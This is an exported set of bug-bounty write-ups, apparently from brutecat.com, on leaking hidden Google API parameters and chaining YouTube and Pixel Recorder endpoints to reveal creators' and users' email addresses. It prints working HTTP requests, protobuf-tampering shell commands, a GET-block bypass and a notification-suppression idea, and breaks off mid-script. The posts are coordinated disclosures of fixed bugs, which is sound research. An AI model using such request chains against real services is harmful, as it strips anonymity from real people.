(type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedSortFilterOptions), 16\\nInvalid value at 'offline_mode_forced' (TYPE_BOOL), 17\\nInvalid value at 'form_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseFormData), 18\\nInvalid value at 'suggest_stats' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.SearchboxStats), 19\\nInvalid value at 'lite_client_request_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.LiteClientRequestData), 20\\nInvalid value at 'unplugged_browse_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedBrowseOptions), 22\\nInvalid value at 'consistency_token' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ConsistencyToken), 23\\nInvalid value at 'intended_deeplink' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DeeplinkData), 24\\nInvalid value at 'android_extended_permissions' (TYPE_BOOL), 25\\nInvalid value at 'browse_notification_params' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseNotificationsParams), 26\\nInvalid value at 'recent_user_event_infos' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.RecentUserEventInfo), 28\\nInvalid value at 'detected_activity_info' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DetectedActivityInfo), 30\",\n    ...\n}\n</code></pre> <p>We can find every non-integer parameter this way. We can then send only booleans instead to find all non-boolean parameters (including integer parameters). We can repeat this for nested messages to find the entire possible request payload.</p> <p>To simplify this process, I wrote a Go tool called req2proto which we can use to automate this.</p> <pre><code>$ git clone https://github.com/ddd/req2proto\n$ go build # this requires golang to be installed, see https://go.dev/doc/install\n$ ./req2proto -X POST -u https://youtubei.googleapis.com/youtubei/v1/browse -p youtube.api.pfiinnertube.GetBrowseRequest -o output -d 3 -v\n</code></pre> <p>If we look at <code>output/youtube/api/pfiinnertube/message.proto</code>, we can see the full request proto for this endpoint:</p> <pre><code>syntax = \"proto3\";\n\npackage youtube.api.pfiinnertube;\n\nmessage GetBrowseRequest {\n  InnerTubeContext context = 1;\n  string browse_id = 2;\n  string params = 3;\n  string continuation = 7;\n  string force_ad_format = 8;\n  int32 debug_level = 9;\n  PlayerRequest player_request = 10;\n  string query = 11;\n  bool has_external_ad_vars = 12;\n  ForceAdParameters force_ad_parameters = 13;\n  string previous_ad_information = 14;\n  bool offline = 15;\n  UnpluggedSortFilterOptions unplugged_sort_filter_options = 16;\n  bool offline_mode_forced = 17;\n  BrowseFormData form_data = 18;\n  SearchboxStats suggest_stats = 19;\n  LiteClientRequestData lite_client_request_data = 20;\n  UnpluggedBrowseOptions unplugged_browse_options = 22;\n  ConsistencyToken consistency_token = 23;\n  DeeplinkData intended_deeplink = 24;\n  bool android_extended_permissions = 25;\n  BrowseNotificationsParams browse_notification_params = 26;\n  int32 installed_sharing_service_ids = 27;\n  RecentUserEventInfo recent_user_event_infos = 28;\n  InlineSettingStatus inline_setting_status = 29;\n  DetectedActivityInfo detected_activity_info = 30;\n  BrowseRequestContext browse_request_context = 31;\n  DeviceContextEvent device_context_info = 32;\n  BrowseRequestSupportedMetadata browse_request_supported_metadata = 33;\n  string target_id = 35;\n  MySubsSettingsState subscription_settings_state = 36;\n  MdxContext mdx_context = 37;\n  CustomTabContext custom_tab_context = 38;\n  ProducerAssetRequestData producer_asset_request_data = 39;\n  LatestContainerItemEventsInfo latest_container_item_events_info = 40;\n  ScrubContinuationClientData scrub_continuation_client_data = 41;\n}\n...\n</code></pre> <p>That's all for now! Happy hacking and feel free to reach out to me if you have any questions.</p>"},{"location":"brutecat.com/Disclosing%20YouTube%20Creator%20Emails%20for%20a%20%2420k%20Bounty_20260205/","title":"Disclosing YouTube Creator Emails for a $20k Bounty","text":"<p>\u6765\u6e90: https://brutecat.com \u94fe\u63a5: https://brutecat.com/articles/youtube-creator-emails \u65e5\u671f: Thu, 13 Mar 2025 00:00:00 GMT</p> <p>Some time back, while playing around with Google API requests, I found out it was possible to leak all request parameters in any Google API endpoint. This was possible because for whatever reason, sending a request with a wrong parameter type returned debug information about that parameter:</p> <p>Request</p> <pre><code>POST /youtubei/v1/browse HTTP/2\nHost: youtubei.googleapis.com\nContent-Type: application/json\nContent-Length: 164\n\n{\n  \"context\": {\n    \"client\": {\n      \"clientName\": \"WEB\",\n      \"clientVersion\": \"2.20241101.01.00\",\n    }\n  },\n  \"browseId\": 1\n}\n</code></pre> <p>The server actually expects <code>browseId</code> to be a string like <code>\"UCX6OQ3DkcsbYNE6H8uQQuVA\"</code></p> <p>Response</p> <pre><code>HTTP/2 400 Bad Request\nContent-Type: application/json; charset=UTF-8\nServer: scaffolding on HTTPServer2\n\n{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"Invalid value at 'browse_id' (TYPE_STRING), 1\",\n    \"errors\": [\n      {\n        \"message\": \"Invalid value at 'browse_id' (TYPE_STRING), 1\",\n        \"reason\": \"invalid\"\n      }\n    ],\n    \"status\": \"INVALID_ARGUMENT\",\n    ...\n  }\n}\n</code></pre> <p>While YouTube's API normally uses JSON requests for web, it actually also supports another format called ProtoJson aka <code>application/json+protobuf</code></p> <p>This allows us to specify parameter values in an array, rather than with the parameter name as we would in JSON. We can abuse this logic to provide the wrong parameter type for all parameters without even knowing its name, leaking information about the entire possible request payload.</p> <p>Request</p> <pre><code>POST /youtubei/v1/browse HTTP/2\nHost: youtubei.googleapis.com\nContent-Type: application/json+protobuf\nContent-Length: 22\n\n[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]\n</code></pre> <p>Response</p> <pre><code>HTTP/2 400 Bad Request\nContent-Type: application/json; charset=UTF-8\nServer: scaffolding on HTTPServer2\n\n{\n  \"error\": {\n    \"code\": 400,\n    \"message\": \"Invalid value at 'context' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext), 1\\nInvalid value at 'browse_id' (TYPE_STRING), 2\\nInvalid value at 'params' (TYPE_STRING), 3\\nInvalid value at 'continuation' (TYPE_STRING), 7\\nInvalid value at 'force_ad_format' (TYPE_STRING), 8\\nInvalid value at 'player_request' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.PlayerRequest), 10\\nInvalid value at 'query' (TYPE_STRING), 11\\nInvalid value at 'has_external_ad_vars' (TYPE_BOOL), 12\\nInvalid value at 'force_ad_parameters' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ForceAdParameters), 13\\nInvalid value at 'previous_ad_information' (TYPE_STRING), 14\\nInvalid value at 'offline' (TYPE_BOOL), 15\\nInvalid value at 'unplugged_sort_filter_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedSortFilterOptions), 16\\nInvalid value at 'offline_mode_forced' (TYPE_BOOL), 17\\nInvalid value at 'form_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseFormData), 18\\nInvalid value at 'suggest_stats' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.SearchboxStats), 19\\nInvalid value at 'lite_client_request_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.LiteClientRequestData), 20\\nInvalid value at 'unplugged_browse_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedBrowseOptions), 22\\nInvalid value at 'consistency_token' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ConsistencyToken), 23\\nInvalid value at 'intended_deeplink' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DeeplinkData), 24\\nInvalid value at 'android_extended_permissions' (TYPE_BOOL), 25\\nInvalid value at 'browse_notification_params' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseNotificationsParams), 26\\nInvalid value at 'recent_user_event_infos' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.RecentUserEventInfo), 28\\nInvalid value at 'detected_activity_info' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DetectedActivityInfo), 30\",\n    ...\n}\n</code></pre> <p>To automate this process, I wrote a tool called req2proto.</p> <pre><code>$ ./req2proto -X POST -u https://youtubei.googleapis.com/youtubei/v1/browse -p youtube.api.pfiinnertube.GetBrowseRequest -o output -d 3\n</code></pre> <p>If we look at the output at <code>output/youtube/api/pfiinnertube/message.proto</code>, we can see the full request payload for this endpoint:</p> <pre><code>syntax = \"proto3\";\n\npackage youtube.api.pfiinnertube;\n\nmessage GetBrowseRequest {\n  InnerTubeContext context = 1;\n  string browse_id = 2;\n  string params = 3;\n  string continuation = 7;\n  string force_ad_format = 8;\n  int32 debug_level = 9;\n  PlayerRequest player_request = 10;\n  string query = 11;\n  ...\n}\n...\n</code></pre> <p>Equipped with this, I started looking around to find any API endpoints with secret parameters that might allow us to leak debug information.</p>"},{"location":"brutecat.com/Disclosing%20YouTube%20Creator%20Emails%20for%20a%20%2420k%20Bounty_20260205/#a-seemingly-secure-endpoint","title":"A seemingly secure endpoint","text":"<p>If you ever looked around at the requests sent by YouTube Studio to load the \"Earn\" tab, you might have noticed the following request:</p> <p></p> <pre><code>POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2\nHost: studio.youtube.com\nContent-Type: application/json\nCookie: &lt;redacted&gt;\n\n{\n  \"context\": {\n    ...\n  },\n  \"channelIds\": [\n    \"UCeGCG8SYUIgFO13NyOe6reQ\"\n  ],\n  \"mask\": {\n    \"channelId\": true,\n    \"monetizationStatus\": true,\n    \"monetizationDetails\": {\n      \"all\": true\n    },\n    ...\n  }\n}\n</code></pre> <p>It's used for fetching our own channel data that's displayed on the Earn tab. That being said, it's actually possible to fetch other channel's metadata with this, albeit with extremely few masks:</p> <p>Request</p> <pre><code>POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2\nHost: studio.youtube.com\nContent-Type: application/json\nCookie: &lt;redacted&gt;\n\n{\n  \"context\": {\n    ...\n  },\n  \"channelIds\": [\n    \"UCdcUmdOxMrhRjKMw-BX19AA\"\n  ],\n  \"mask\": {\n    \"channelId\": true,\n    \"title\": true,\n    \"thumbnailDetails\": {\n      \"all\": true\n    },\n    \"metric\": {\n      \"all\": true\n    },\n    \"timeCreatedSeconds\": true,\n    \"isNameVerified\": true,\n    \"channelHandle\": true\n  }\n}\n</code></pre> <p>Response</p> <pre><code>HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\nServer: scaffolding on HTTPServer2\n\n{\n  \"channels\": [\n    {\n      \"channelId\": \"UCdcUmdOxMrhRjKMw-BX19AA\",\n      \"title\": \"Niko Omilana\",\n      ...\n      \"metric\": {\n        \"subscriberCount\": \"7700000\",\n        \"videoCount\": \"142\",\n        \"totalVideoViewCount\": \"650836435\"\n      },\n      \"timeCreatedSeconds\": \"1308700645\",\n      \"isNameVerified\": true,\n      \"channelHandle\": \"@Niko\",\n    }\n  ]\n}\n</code></pre> <p>The masks seemed quite secure. If we tried requesting any other mask that could be sensitive for a channel we don't have access to, we'd be hit with a Permission denied error:</p> <pre><code>{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"The caller does not have permission\",\n    \"errors\": [\n      {\n        \"message\": \"The caller does not have permission\",\n        \"domain\": \"global\",\n        \"reason\": \"forbidden\"\n      }\n    ],\n    \"status\": \"PERMISSION_DENIED\"\n  }\n}\n</code></pre>"},{"location":"brutecat.com/Disclosing%20YouTube%20Creator%20Emails%20for%20a%20%2420k%20Bounty_20260205/#leaking-secret-hidden-parameters","title":"Leaking secret hidden parameters","text":"<p>As it turns out, if we dump the request payload for this endpoint with req2proto, we can see there's actually 2 secret hidden parameters:</p> <pre><code>syntax = \"proto3\";\n\npackage youtube.api.pfiinnertube;\n\nmessage GetCreatorChannelsRequest {\n  InnerTubeContext context = 1;\n  string channel_ids = 2;\n  CreatorChannelMask mask = 4;\n  DelegationContext delegation_context = 5;\n  bool critical_read = 6; // ???\n  bool include_suspended = 7; // ???\n}\n</code></pre> <p>Enabling <code>criticalRead</code> didn't seem to change anything, but <code>includeSuspended</code> was very interesting:</p> <pre><code>{\n  ...\n  \"contentOwnerAssociation\": {\n    \"externalContentOwnerId\": \"Ks_zqCBHrAbeQqsVRGL7gw\",\n    \"createTime\": {\n      \"seconds\": \"1693939737\",\n      \"nanos\": 472296000\n    },\n    \"permissions\": {\n      \"canWebClaim\": true,\n      \"canViewRevenue\": true\n    },\n    \"isDefaultChannel\": false,\n    \"activateTime\": {\n      \"seconds\": \"1693939737\",\n      \"nanos\": 472296000\n    }\n  },\n  ...\n}\n</code></pre> <p>It seemed to leak the channel's <code>contentOwnerAssociation</code> But what exactly is that?</p>"},{"location":"brutecat.com/Disclosing%20YouTube%20Creator%20Emails%20for%20a%20%2420k%20Bounty_20260205/#a-look-into-content-id","title":"A look into Content ID","text":"<p>In YouTube, there's certain type of special account known as a Content Manager which are given to a select few trusted rightsholders. With these accounts, it's possible to upload audio/video to Content ID as an asset, copyright claiming any external videos that contain the same audio/video as your asset.</p> <p></p> <p>These accounts are particularly sensitive, as the Content Manager account allows you to monetize any videos found that contain similar audio/video. Hence, these special accounts are only given to rightsholders with \"complex rights management needs\".</p> <p>YouTube actually provides a watered-down version of this to all 3 million monetized YouTube creators, known as the Copyright Match Tool. This tool only allows creators to request the takedown of videos using their content, rather than being able to monetize them. </p> <p></p> <p>The interesting thing is that, the backend of this tool is the same as a Content Manager. The moment a channel gets monetization, a <code>CONTENT_OWNER_TYPE_IVP</code> content owner account is created:</p> <pre><code>{\n  \"contentOwnerId\": \"Ks_zqCBHrAbeQqsVRGL7gw\",\n  \"displayName\": \"Nia\",\n  \"type\": \"CONTENT_OWNER_TYPE_IVP\",\n  \"industryType\": \"INDUSTRY_TYPE_WEB\",\n  \"primaryContactEmail\": \"&lt;redacted&gt;@gmail.com\",\n  \"timeCreatedSeconds\": \"1693939736\",\n  \"traits\": {\n    \"isLongTail\": true,\n    \"isAffiliate\": false,\n    \"isManagedTorso\": false,\n    \"isPremium\": false,\n    \"isUserLevelCidClaimUpdateable\": false,\n    \"isTorso\": false,\n    \"isFingerprintEnabled\": false,\n    \"isBrandconnectAgency\": false,\n    \"isTwoStepVerificationRequirementExempt\": false\n  },\n  \"country\": \"FI\"\n}\n</code></pre> <p>Fun fact: \"IVP\" actually stands for Individual Video Partnership, the old name for the YouTube Partner Program!</p> <p>So, we can leak the <code>contentOwnerId</code> of the IVP content owner tied of the channel, but what exactly can we do with this? After doing some research, I found the YouTube Content ID API, which is an API intended for rightsholders with a Content Manager account. The <code>contentOwners.list</code> endpoint looked particularly interesting. It took in a Content Owner ID and returned their \"conflict notification email\".</p> <p>Unfortunately, the API seemed to be validating that I didn't have a Content Manager account, and just returned forbidden for any request:</p> <pre><code>{\n  \"error\": {\n    \"code\": 403,\n    \"message\": \"Forbidden\",\n    \"errors\": [\n      {\n        \"message\": \"Forbidden\",\n        \"domain\": \"global\",\n        \"reason\": \"forbidden\"\n      }\n    ]\n  }\n}\n</code></pre> <p>Even though this endpoint is only intended for those with a Content Manager account, I had a suspicion that an IVP Content Owner might still work. </p> <p>I asked a friend of mine with a monetized YouTube channel test out this endpoint in the API explorer, and it worked.</p> <pre><code>{\n  \"kind\": \"youtubePartner#contentOwnerList\",\n  \"items\": [\n    {\n      \"kind\": \"youtubePartner#contentOwner\",\n      \"id\": \"kdVwk95TnaCSLJJfyIFoqw\",\n      \"displayName\": \"omilana7\",\n      \"conflictNotificationEmail\": \"&lt;redacted&gt;@yahoo.co.uk\"\n    }\n  ]\n}\n</code></pre> <p>The conflict notification email was the channel's email at the time the channel got monetized!</p> <p>Interestingly enough, for whatever reason, even though it worked in the API explorer, you couldn't actually add this API to your own Google Cloud project since it only whitelisted users with an actual Content Manager account. That didn't matter though, we could simply call this API with the API Explorer's client.</p>"},{"location":"brutecat.com/Disclosing%20YouTube%20Creator%20Emails%20for%20a%20%2420k%20Bounty_20260205/#putting-the-attack-together","title":"Putting the attack together","text":"<p>We have both parts we need for the attack, let's put it together!</p> <ul> <li>Fetch <code>/get_creator_channels</code> with <code>includeSuspended: true</code> to leak the victim's IVP Content Owner ID.</li> <li>Use the Content ID API Explorer with a Google account tied to a monetized channel to fetch the conflict notification email of the victim's IVP Content Owner</li> <li>Profit!</li> </ul>"},{"location":"brutecat.com/Disclosing%20YouTube%20Creator%20Emails%20for%20a%20%2420k%20Bounty_20260205/#timeline","title":"Timeline","text":"<ul> <li>2024-12-12 - Report sent to vendor</li> <li>2024-12-16 - Vendor triaged report</li> <li>2024-12-17 - \ud83c\udf89 Nice catch!</li> <li>2025-01-21 - Panel awards $13,337. Rationale: Normal Google Applications. Vulnerability category is \"bypass of significant security controls\", PII or other confidential information.</li> <li>2025-01-21 - Clarified to vendor that this was rewarded under \"Normal Google Applications\". However, www.youtube.com and studio.youtube.com are Tier 1 domains. See: https://github.com/google/bughunters/blob/main/domain-tiers/external_domains_google.asciipb</li> <li>2025-01-23 - Panel awards an additional $6,663. Rationale: Domains where a vulnerability could disclose particularly sensitive user data. Vulnerability category is \"bypass of significant security controls\", PII or other confidential information.</li> <li>2025-02-10 - Coordinates disclosure with vendor for 2025-03-13</li> <li>2025-02-13 - \ud83c\udf89 Google VRP awards swag</li> <li>2025-02-21 - Vendor confirms issue has been fixed (T+71 days since disclosure)</li> <li>2025-03-13 - Report disclosed</li> </ul>"},{"location":"brutecat.com/Disclosing%20YouTube%20Creator%20Emails%20for%20a%20%2420k%20Bounty_20260205/#additional-notes","title":"Additional notes","text":"<p>It turns out that the <code>includeSuspended</code> parameter could've also been found from the InnerTube discovery document.</p> <p>When you try to fetch the discovery document normally, you get the following error:</p> <p>Request</p> <pre><code>GET /$discovery/rest HTTP/2\nHost: youtubei.googleapis.com\n</code></pre> <p>Response</p> <pre><code>HTTP/2 405 Method Not Allowed\nContent-Type: text/html; charset=UTF-8\n</code></pre> <p>It seems that <code>youtubei.googleapis.com</code> has some ESPv2 rule set to block GET requests for whatever reason.</p> <p>I quickly found out we can actually bypass this by sending a POST request, and then overriding it to GET with <code>X-Http-Method-Override</code> to get around the block GET rule:</p> <p>Request</p> <pre><code>POST /$discovery/rest HTTP/2\nHost: youtubei.googleapis.com\nX-Http-Method-Override: GET\n</code></pre> <p>Response</p> <pre><code>HTTP/2 200\ncontent-type: application/json; charset=UTF-8\n\n{\n  \"baseUrl\": \"https://youtubei.googleapis.com/\",\n  \"title\": \"YouTube Internal API (InnerTube)\",\n  \"documentationLink\": \"http://go/itgatewa\",\n  ...\n</code></pre> <p>Update 2025-03-01: both the prod (archive) and staging (archive) discovery documents have since been removed.</p> <p>If we Ctrl-F for GetCreatorChannelsRequest, we can find the <code>includeSuspended</code> parameter:</p> <pre><code>  ...\n  \"YoutubeApiInnertubeGetCreatorChannelsRequest\": {\n      \"id\": \"YoutubeApiInnertubeGetCreatorChannelsRequest\",\n      \"properties\": {\n        \"channelIds\": {\n          \"items\": {\n            \"type\": \"string\"\n          },\n          \"type\": \"array\"\n        },\n        ...\n        \"includeSuspended\": {\n          \"type\": \"boolean\"\n        },\n        ...\n      },\n      \"type\": \"object\"\n    },\n  ...\n</code></pre>"},{"location":"brutecat.com/Leaking%20the%20email%20of%20any%20YouTube%20user%20for%20%2410%2C000_20260205/","title":"Leaking the email of any YouTube user for $10,000","text":"<p>\u6765\u6e90: https://brutecat.com \u94fe\u63a5: https://brutecat.com/articles/leaking-youtube-emails \u65e5\u671f: Wed, 12 Feb 2025 00:00:00 GMT</p> <p>Some time ago, I was looking for a research target in Google and was digging through the Internal People API (Staging) discovery document until I noticed something interesting:</p> <pre><code>   \"BlockedTarget\": {\n      \"id\": \"BlockedTarget\",\n      \"description\": \"The target of a user-to-user block, used to specify creation/deletion of blocks.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"profileId\": {\n          \"description\": \"Required. The obfuscated Gaia ID of the user targeted by the block.\",\n          \"type\": \"string\"\n        },\n        \"fallbackName\": {\n          \"description\": \"Required for `BlockPeopleRequest`. A display name for the user being blocked. The viewer may see this in other surfaces later, if the blocked user has no profile name visible to them. Notes: * Required for `BlockPeopleRequest` (may not currently be enforced by validation, but should be provided) * For `UnblockPeopleRequest` this does not need to be set.\",\n          \"type\": \"string\"\n        }\n      }\n    },\n</code></pre> <p>It seemed the Google-wide block user functionality was based on an obfuscated Gaia ID as well as a display name for that blocked user. The obfuscated Gaia ID is just a Google account identifier.  </p> <p>That seemed perfectly fine until I remembered this support page:  </p> <p></p> <p>So, if you block someone on YouTube, you can leak their Google account identifier? I tested it out. I went to a random livestream, blocked a user and sure enough, it showed up in https://myaccount.google.com/blocklist </p> <p></p> <p>The fallback name was set as their channel name Mega Prime and the profile ID was their obfuscated Gaia ID 107183641464576740691 </p> <p>This was super strange to me because YouTube should never leak the underlying Google account of a YouTube channel. In the past, there's been several bugs to resolve these to an email address, so I was confident there was still a Gaia ID to Email in some old obscure Google product.</p>"},{"location":"brutecat.com/Leaking%20the%20email%20of%20any%20YouTube%20user%20for%20%2410%2C000_20260205/#escalating-this-to-4-billion-youtube-channels","title":"Escalating this to 4 billion YouTube channels","text":"<p>So, we can leak the Gaia ID of any live chat user, but can we escalate this to all channels on YouTube? As it turns out, when you click the 3 dots just to open the context menu, a request is fired:</p> <p></p> <p>Request</p> <pre><code>POST /youtubei/v1/live_chat/get_item_context_menu?params=R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9&amp;pbj=1&amp;prettyPrint=false HTTP/2\nHost: www.youtube.com\nCookie: &lt;redacted&gt;\n</code></pre> <p>Response</p> <pre><code>HTTP/2 200 OK\nContent-Type: application/json; charset=UTF-8\nServer: scaffolding on HTTPServer2\n\n{\n  ...\n  \"serviceEndpoint\": {\n    ...\n    \"commandMetadata\": {\n      \"webCommandMetadata\": {\n        \"sendPost\": true,\n        \"apiUrl\": \"/youtubei/v1/live_chat/moderate\"\n      }\n    },\n    \"moderateLiveChatEndpoint\": {\n      \"params\": \"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=\"\n    }\n  }\n  ...\n}\n</code></pre> <p>That <code>params</code> is nothing more than just base64 encoded protobuf, which is a common encoding format used throughout Google.  </p> <p>If we try decoding that <code>moderateLiveChatEndpoint</code> params:</p> <pre><code>$ echo -n \"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=\" | base64\n -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw\n1 {\n  5 {\n    1: \"UChs0pSaEoNLV4mevBFGaoKA\"\n    2: \"36YnV9STBqc\"\n  }\n}\n10: 0\n11: 1\n12 {\n  1: \"113907466537670370590\"\n  2: \"SE-aYOb-uCg059qHRis_ow\"\n}\n14: 0\n</code></pre> <p>It actually just contains the Gaia ID of the user we want to block, we don't even need to block them!</p> <p>Let's check out the <code>get_item_context_menu</code> requests params too:</p> <pre><code>$ echo -n \"R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9\" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw\n3 {\n  5 {\n    1: \"UChs0pSaEoNLV4mevBFGaoKA\"\n    2: \"36YnV9STBqc\"\n  }\n}\n6 {\n  1: \"UCSE-aYOb-uCg059qHRis_ow\"\n}\n</code></pre> <p>Seems to just contain the channel ID of the channel we're blocking, the livestream video ID and livestream author ID. Let's try to fake the request params with our own target's channel ID.  </p> <p>For this test, we'll use a Topic Channel since they are auto-generated by YouTube and guaranteed to not have any live chat messages.</p> <pre><code>$ echo -n \"&lt;SNIP&gt;\" | base64 -d | sed 's/%3D/=/g' | base64 -d | sed 's/UCSE-aYOb-uCg059qHRis_ow/UCD2LZAT1j1DyVXq2R2BdusQ/g' | base64 | base64\nR2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlEwUXlURnBCVkRGcQpNVVI1VmxoeE1sSXlRbVIxYzFFPQo=\n</code></pre> <p>Testing this on <code>/youtubei/v1/live_chat/get_item_context_menu</code>:</p> <pre><code>...\n\"moderateLiveChatEndpoint\":{\"params\":\"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=\"}\n...\n\n\necho -n \"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=\" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw\n1 {\n  5 {\n    1: \"UChs0pSaEoNLV4mevBFGaoKA\"\n    2: \"36YnV9STBqc\"\n  }\n}\n10: 0\n11: 1\n12 {\n  1: \"103261974221829892167\"\n  2: \"D2LZAT1j1DyVXq2R2BdusQ\"\n}\n14: 0\n</code></pre> <p>We can leak the Gaia ID of the channel - 103261974221829892167</p>"},{"location":"brutecat.com/Leaking%20the%20email%20of%20any%20YouTube%20user%20for%20%2410%2C000_20260205/#the-missing-puzzle-piece-pixel-recorder","title":"The missing puzzle piece: Pixel Recorder","text":"<p>I told my friend nathan about the YouTube Gaia ID leak and we started looking into old forgotten Google products since they probably contained some bug or logic flaw to resolve a Gaia ID to an email. Pixel Recorder was one of them. Nathan made a test recording on his Pixel phone and synced it to his Google account so we could access the endpoints on the web at https://recorder.google.com:  </p> <p></p> <p>When we tried sharing the recording to a test email, that's when it hit us:</p> <p>Request</p> <pre><code>POST /$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/WriteShareList HTTP/2\nHost: pixelrecorder-pa.clients6.google.com\nCookie: &lt;redacted&gt;\nContent-Length: 80\nAuthorization: &lt;redacted&gt;\nX-Goog-Api-Key: AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro\nContent-Type: application/json+protobuf\nReferer: https://recorder.google.com/\n\n[\"7adab89e-4ace-4945-9f75-6fe250ccbe49\",null,[[\"113769094563819690011\",2,null]]]\n</code></pre> <p>Response</p> <pre><code>HTTP/2 200 OK\nContent-Type: application/json+protobuf; charset=UTF-8\nServer: ESF\nContent-Length: 138\n\n[\"28bc3792-9bdb-4aed-9a78-17b0954abc7d\",[[null,2,\"vrptest2@gmail.com\"]]]\n</code></pre> <p>This endpoint was taking in the obfuscated Gaia ID and... returning the email? </p> <p>We tested this with the obfuscated Gaia ID <code>107183641464576740691</code> we got from blocking that user on YouTube a while back and it worked :</p> <pre><code>HTTP/2 200 OK\nContent-Type: application/json+protobuf; charset=UTF-8\nServer: ESF\nContent-Length: 138\n\n[\"28bc3792-9bdb-4aed-9a78-17b0954abc7d\",[[null,2,\"redacted@gmail.com\"],[null,2,\"vrptest2@gmail.com\"]]]\n</code></pre>"},{"location":"brutecat.com/Leaking%20the%20email%20of%20any%20YouTube%20user%20for%20%2410%2C000_20260205/#a-small-problem-preventing-notification-to-the-target","title":"A small problem: preventing notification to the target","text":"<p>It seems that whenever we share a recording with a victim, they receive an email that looks like this:  </p> <p></p> <p>This is really bad , and it would lower the impact of the bug quite a lot. On the share pop-up, there didn't seem to be any option to disable notifications.</p> <p></p> <p>I tried leaking the full request proto via my tool req2proto, but there was nothing about disabling the email notification:</p> <pre><code>syntax = \"proto3\";\n\npackage java.com.google.wireless.android.pixel.recorder.protos;\n\nimport \"java/com/google/wireless/android/pixel/recorder/sharedclient/acl/protos/message.proto\";\n\nmessage WriteShareListRequest {\n  string recording_id = 1;\n  string delete_obfuscated_gaia_ids = 2;\n  ShareUser update_shared_users = 3;\n  string sharing_message = 4;\n}\n\nmessage ShareUser {\n  string obfuscated_gaia_id = 1;\n  java.com.google.wireless.android.pixel.recorder.sharedclient.acl.protos.ResourceAccessRole role = 2;\n  string email = 3;\n}\n</code></pre> <p>Even trying to add and remove the user at the same time didn't work, the email was still sent. But that's when we realized - if it's including our recording title in the email subject, perhaps it wouldn't be able to send an email if our recording title was too long.  </p> <p>We hacked together a quick python script to test this out:</p> <pre><code>import requests\n\nBASE_URL = \"https://pixelrecorder-pa.clients6.google.com/$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/\"\n\nheaders = {\n    \"Host\": \"pixelrecorder-pa.clients6.google.com\",\n    \"Content-Type\": \"application/json+protobuf\",\n    